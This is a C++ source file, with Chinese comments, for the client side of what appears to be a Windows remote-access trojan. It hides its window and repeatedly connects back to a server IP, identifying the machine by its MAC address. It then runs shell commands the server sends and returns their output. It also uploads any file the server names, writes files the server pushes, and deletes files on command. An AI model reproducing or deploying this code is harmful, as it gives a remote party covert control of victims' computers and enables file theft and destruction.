//#define _CRT_SECURE_NO_WARNINGS
#include "ClientSocket.h"
#include"GetMAC.h"
#include"CmdLine.h"
#include <winsock.h>
#include <fstream>
#pragma comment(lib,"ws2_32.lib")
#include<io.h>
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) //隐藏窗口
#include<iostream>
using namespace std;
/*全局变量*/
namespace PublicMumber{
	SOCKET socket;
	int Flag_Trans_Switch;//0：正常 1：中断传输
	string sendFilePathName;
};

/*
		数据包结构
		1.数据头 6652：断开连接 6653：申请建立连接 6654：同意连接 6655:文件发送成功 6656:下载文件 6657:终止下载
				 6658:文件不存在 
				
		2.数据包
		2.1命令
		2.2文件头
		2.3文件
*/
typedef struct transBag {
	int transBagHead;
	union {
		char num[13];
		char transBagOrder[2048];
		struct
		{
			char name[1024];
			long length;
		}transBagFileHead;
		char transBagFileBody[2048];
	}transBagBody;

}transBag;
/*处理命令*/
DWORD WINAPI ordersDeal(LPVOID lpPararmeter)
{
	typedef struct OrdersSocket {
		char orders[2048];
		SOCKET clientSocket;
	}OrdersSocket;
	OrdersSocket* ordersSocket = (OrdersSocket*)lpPararmeter;
	SOCKET clientSocket = ordersSocket->clientSocket;
	std::string result;
	std::string orders = ordersSocket->orders;
	CmdLine::cmdLine(orders, result);
	transBag transBagSend;
	memset(&transBagSend, 0, sizeof(transBag));
	transBagSend.transBagHead = 1;
	/*循环发送直到返回所有消息*/

#define LENGTH_ORDERS_RESULT 2048
	if (result.size() < LENGTH_ORDERS_RESULT)
	{
		for (int i = 0; i < result.size(); i++)
		{
			transBagSend.transBagBody.transBagOrder[i] = result[i];
		}

		send(clientSocket, (char*)& transBagSend, sizeof(transBag), 0);
	
	}
	else
	{
		int muti = result.size() / (LENGTH_ORDERS_RESULT - 1) + ((result.size() % (LENGTH_ORDERS_RESULT - 1)) > 0);
		for (int i = 0; i < muti; i++)
		{
			memset(&transBagSend, 0, sizeof(transBag));
			transBagSend.transBagHead = 1;
			if (i < muti - 1)
			{
				for (int n = 0; n < LENGTH_ORDERS_RESULT - 1; n++)
				{
					transBagSend.transBagBody.transBagOrder[n] = result[i * (LENGTH_ORDERS_RESULT - 1) + n];
				}
				transBagSend.transBagBody.transBagOrder[LENGTH_ORDERS_RESULT - 1] = '\0';
			}
			else if (i == muti - 1)
			{
				for (int n = 0; n < result.size() - i * (LENGTH_ORDERS_RESULT - 1); n++)
				{
					transBagSend.transBagBody.transBagOrder[n] = result[i * (LENGTH_ORDERS_RESULT - 1) + n];
				}
			}
			send(clientSocket, (char*)& transBagSend, sizeof(transBag), 0);
		}

	}

	return 0;
}
/*向服务器发送文件*/
DWORD WINAPI sendFile(LPVOID lpPararmeter)
{
	SOCKET clientSocket = PublicMumber::socket;
	std::fstream in;
	//cout << "or:"<<(char*)lpPararmeter << endl;
	in.open(PublicMumber::sendFilePathName,
		std::fstream::in | std::fstream::binary);
	transBag transBagSend;
	memset(&transBagSend, 0, sizeof(transBag));
	if (!in.is_open()) {
		transBagSend.transBagHead = 6658;
		send(clientSocket,(char*)& transBagSend,sizeof(transBag),0);
		return ERROR;
	}
	
	transBagSend.transBagHead = 2;
	in.seekg(0, std::fstream::end);//以最后的位置为基准不偏移
	long Flen = transBagSend.transBagBody.transBagFileHead.length = in.tellg();//取得文件大小
	in.seekg(0, std::fstream::beg);
	send(clientSocket, (char*)& transBagSend, sizeof(transBag), 0);//发送文件信息
#define LENGTH_FILE_BODY 2048
	char szBuf[LENGTH_FILE_BODY] = { 0 };
	while (!in.eof())
	{
		in.read(szBuf, LENGTH_FILE_BODY);
		int len = in.gcount();
		send(clientSocket, szBuf, len, 0);
	}
	in.close();
	return 1;
}

ClientSocket::ClientSocket()
{
}

ClientSocket::~ClientSocket()
{
}

int ClientSocket::start(int port,char*ip)
{
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return ERROR;
	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET)
		return ERROR;
	SOCKADDR_IN clientAddr;
	clientAddr.sin_addr.S_un.S_addr = inet_addr(ip);
	clientAddr.sin_family = AF_INET;
	clientAddr.sin_port = htons(port);
	/*持续连接*/
	while (1)
	{
		if (connect(clientSocket, (struct  sockaddr*) & clientAddr, sizeof(clientAddr)) != INVALID_SOCKET)
			break;
		else
			Sleep(60000);
	}
	/*
	1.连接成功
	2.获取本机标识码
	3.发送本机标识码
	*/
	std::string macAdress;
	if(!GetMAC::GetMacByGetAdaptersInfo(macAdress))
		return ERROR;

	transBag transBagSendLogin;
	memset(&transBagSendLogin, 0, sizeof(transBag));
	transBagSendLogin.transBagHead = 4;
	for(int i=0;i< macAdress.size();i++)
		transBagSendLogin.transBagBody.num[i]= macAdress[i];
	send(clientSocket, (char*)& transBagSendLogin, sizeof(transBag), 0);
	PublicMumber::socket = clientSocket;
	while (1)
	{
		transBag transBagRecv;
		memset(&transBagRecv, 0, sizeof(transBag));
		transBag transBagSend;
		int r = recv(clientSocket,(char*)& transBagRecv,sizeof(transBag),0);
		if (r > 0)
		{
			std::string result="";
			memset(&transBagSend, 0, sizeof(transBag));
			switch (transBagRecv.transBagHead)
			{
			case 1://命令
			{
				typedef struct OrdersSocket {
					char orders[2048];
					SOCKET clientSocket;
				}OrdersSocket;
				OrdersSocket ordersSocket;
				ordersSocket.clientSocket = clientSocket;		
				for (int i = 0; i<2048; i++)
				{
					ordersSocket.orders[i] = transBagRecv.transBagBody.transBagOrder[i];
				}
				HANDLE handle = CreateThread(NULL, 0, ordersDeal, &ordersSocket, 0, NULL);
				CloseHandle(handle);
			}
				break;
			case 2://文件信息
			{
				std::fstream out;//写入文件
				out.open(transBagRecv.transBagBody.transBagFileHead.name,
					std::fstream::out | std::fstream::binary | std::fstream::trunc);
				long flen = transBagRecv.transBagBody.transBagFileHead.length;
				int len = 0;
				char content[2048] = { 0 };
				int flag = 0;//是否下载成功
#define LENGTH_FILE_BODY 2048
				while (flen)
				{
					len = recv(clientSocket, content, LENGTH_FILE_BODY, 0);
					if (len > 0)
					{
						out.write(content, len);
						flen -= len;
						if (flen == 0)flag = 1;
					}
					else if (len <= 0 && errno != EINTR)
						break;
				}
				out.close();
				if (flag)
				{
					transBagSend.transBagHead = 6655;
					send(clientSocket, (char*)& transBagSend, sizeof(transBag), 0);
				}
				
			}
				break;
			case 6657://中断传输
			case 6652://断开连接
			{
				/*
				文件传输停止
				*/
				PublicMumber::Flag_Trans_Switch = 1;//中断指令
			}
				break;
			case 6653://申请连接
			{
				transBagSend.transBagHead = 6654;
				send(clientSocket, (char*)& transBagSend, sizeof(transBag), 0);
			}
				break;
			case 6656://下载文件
			{
				PublicMumber::Flag_Trans_Switch = 0;
				PublicMumber::sendFilePathName = transBagRecv.transBagBody.transBagOrder;
				HANDLE handle = CreateThread(NULL, 0, sendFile, NULL, 0, NULL);
				CloseHandle(handle);
				
			}
				break;
			case 6660:
			{
				if (_access(transBagRecv.transBagBody.transBagOrder, 0) == 0)
				{	/*目录存在，重新发回*/
					transBagRecv.transBagHead = 6661;
					send(clientSocket, (char*)& transBagRecv, sizeof(transBag), 0);
				}
				else
				{
					/*目录不存在，重新发回*/
					transBagRecv.transBagHead = 6662;
					send(clientSocket, (char*)& transBagRecv, sizeof(transBag), 0);
				}
			}
				break;
			case 6663:
			{
				if (remove(transBagRecv.transBagBody.transBagOrder) == 0)
				{
					transBagRecv.transBagHead = 6664;
					send(clientSocket, (char*)& transBagRecv, sizeof(transBag), 0);
				}
				else
				{
					transBagRecv.transBagHead = 6665;
					send(clientSocket, (char*)& transBagRecv, sizeof(transBag), 0);
				}
			}
				break;
			case 6666://退出程序
			{
				closesocket(PublicMumber::socket);
				WSACleanup();
				return 0;
			}
			default:
				break;
			}
		}
		else if (r <= 0 && errno != EINTR)
		{
			closesocket(PublicMumber::socket);
			WSACleanup();
			break;
		}
	}
	return 1;
}


